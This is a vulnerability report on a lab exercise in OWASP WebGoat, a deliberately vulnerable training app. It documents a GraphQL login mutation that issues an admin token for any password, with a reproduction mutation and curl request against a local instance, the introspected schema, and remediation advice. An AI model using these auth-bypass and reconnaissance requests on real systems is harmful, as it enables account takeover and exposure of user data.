# OWASP WebGoat — GraphQL Broken Authentication

- **Target:** OWASP WebGoat GraphQL service (local instance, `http://127.0.0.1:4000`, app at `http://127.0.0.1:8080/WebGoat`)
- **Category:** Broken Authentication / Excessive Data Exposure (OWASP A07, API3)
- **Severity:** Critical
- **Status:** Confirmed (reproduced)

> Authorized environment: OWASP WebGoat is an intentionally vulnerable
> application, run locally for training.

## Summary

The GraphQL `userLogin` mutation returns a valid session for the `admin`
account **without verifying the password** — any password value, including a
random string, is accepted. Combined with introspection being enabled and the
`User` type exposing `password` and `token` fields, an anonymous attacker can
map the schema and authenticate as an administrator.

## Reconnaissance

Introspection was enabled, exposing the full schema (5 queries / 3 mutations):

```
queries:   userFindbyId, userSearchByUsername, noteFindbyId, readNote, getPassphrase
mutations: userLogin, createNote, updateUserUploadFile
```

The `User` type exposes sensitive fields directly:

- `User.password`
- `User.token`

## Steps to reproduce

Call `userLogin` with the admin username and an arbitrary (wrong) password:

```graphql
mutation {
  userLogin(username: "admin", password: "wrong-random-string-123") {
    token
  }
}
```

```bash
curl -s -X POST http://127.0.0.1:4000/ \
  -H 'Content-Type: application/json' \
  -d '{"query":"mutation { userLogin(username:\"admin\", password:\"wrong-random-string-123\"){ token } }"}'
```

The mutation returns a valid `token` even though the password is incorrect —
the resolver never checks the credential. That token authenticates subsequent
requests as `admin`.

## Impact

- Full authentication bypass for the administrator account.
- Schema introspection + exposed `password`/`token` fields let an attacker
  enumerate and read sensitive user data.
- Verbose backend errors (e.g. `userFindbyId`, `userSearchByUsername`,
  `noteFindbyId` leaking filesystem paths under `/home/`) aid further attacks.

## Related findings in the same assessment

- Spring Boot Actuator endpoints reachable: `/WebGoat/actuator`,
  `/WebGoat/actuator/env`, `/actuator/configprops` — configuration/environment
  disclosure.
- Tomcat stack traces enabled; missing `SameSite` cookie attribute.

## Remediation

- The login resolver must verify the submitted password against a stored hash
  (bcrypt/argon2) and only issue a token on success.
- Disable GraphQL introspection in production.
- Remove `password`/`token` from the publicly resolvable `User` type; never
  expose secret fields in the schema.
- Return generic GraphQL errors; disable verbose stack traces.
- Restrict or disable Actuator endpoints and require authentication for them.

## References

- OWASP API Security Top 10 — API2 Broken Authentication, API3 Excessive Data Exposure
- OWASP Top 10 — A07:2021 Identification and Authentication Failures
- CWE-287: Improper Authentication
